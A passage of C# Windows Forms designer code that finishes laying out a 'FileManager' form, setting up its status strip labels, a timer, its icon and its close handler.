		this.statusStrip1.Location = new System.Drawing.Point(0, 513);
		this.statusStrip1.Name = "statusStrip1";
		this.statusStrip1.Size = new System.Drawing.Size(1058, 32);
		this.statusStrip1.TabIndex = 2;
		this.statusStrip1.Text = "statusStrip1";
		this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
		this.toolStripStatusLabel1.Size = new System.Drawing.Size(20, 25);
		this.toolStripStatusLabel1.Text = "..";
		this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
		this.toolStripStatusLabel2.Size = new System.Drawing.Size(20, 25);
		this.toolStripStatusLabel2.Text = "..";
		this.toolStripStatusLabel3.ForeColor = System.Drawing.Color.Red;
		this.toolStripStatusLabel3.Name = "toolStripStatusLabel3";
		this.toolStripStatusLabel3.Size = new System.Drawing.Size(20, 25);
		this.toolStripStatusLabel3.Text = "..";
		this.timer1.Interval = 1000;
		this.timer1.Tick += new System.EventHandler(Timer1_Tick);
		base.AutoScaleDimensions = new System.Drawing.SizeF(9f, 20f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.ClientSize = new System.Drawing.Size(1058, 545);
		base.Controls.Add(this.statusStrip1);
		base.Controls.Add(this.listView1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.Name = "FormFileManager";
		this.Text = "FileManager";
		base.FormClosed += new System.Windows.Forms.FormClosedEventHandler(FormFileManager_FormClosed);
		this.contextMenuStrip1.ResumeLayout(false);
		this.statusStrip1.ResumeLayout(false);
		this.statusStrip1.PerformLayout();
		base.ResumeLayout(false);
	}
}
